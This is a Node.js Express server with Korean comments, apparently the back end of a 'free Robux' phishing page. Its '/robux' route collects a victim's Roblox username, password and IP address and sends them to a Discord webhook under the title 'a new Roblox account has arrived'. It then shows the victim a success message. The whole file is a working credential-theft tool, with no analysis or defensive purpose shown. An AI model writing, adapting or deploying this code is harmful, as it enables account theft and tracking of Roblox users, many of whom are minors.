const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");
require('dotenv').config();

const app = express();
const port = 3000;

app.use(express.static("public"));
app.set("trust proxy", true);


// 본문 파싱
app.use(bodyParser.urlencoded({
    extended: true
}));

// POST /robux 핸들러
app.post("/robux", async (req, res) => {
    const robloxId = req.body.roblox_id;
    const robloxPwd = req.body.roblox_pwd;

    // IP 가져오기
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    // 디스코드 웹훅 URL
    const webhookUrl = process.env.WEBHOOK_URL;

    const content = {
        embeds: [{
            title: "📌 새로운 Roblox 계정이 도착했습니다!",
            color: 0x3498db, // 파란색 계열 (16진수)
            fields: [{
                    name: "아이디",
                    value: `\`${robloxId}\``,
                    inline: true
                },
                {
                    name: "비밀번호",
                    value: `\`${robloxPwd}\``,
                    inline: true
                },
                {
                    name: "IP 주소",
                    value: `\`${clientIp}\``,
                    inline: false
                }
            ],
            timestamp: new Date().toISOString()
        }]
    };

    try {
        // 디스코드 웹훅으로 POST 요청
        const response = await axios.post(webhookUrl, content);

        // 사용자에게 응답
        res.send("성공적으로 제출되었습니다.");
    } catch (error) {
        console.error("웹훅 전송 실패:", error);
        res.status(500).send("오류 발생");
    }
});

app.listen(port, () => {
    console.log('서버 실행중');
});